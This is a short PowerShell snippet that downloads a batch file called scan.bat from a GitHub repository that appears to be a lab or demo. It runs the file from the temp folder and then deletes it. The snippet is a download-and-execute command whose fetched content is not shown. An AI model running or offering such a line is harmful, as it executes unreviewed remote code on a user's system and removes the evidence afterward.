Invoke-WebRequest "https://raw.githubusercontent.com/crjptpp/tpplab_public/main/sedemo01/scan.bat" -OutFile $env:TEMP\scan.bat
Start-Process -Wait $env:TEMP\scan.bat
Remove-Item $env:TEMP\scan.bat
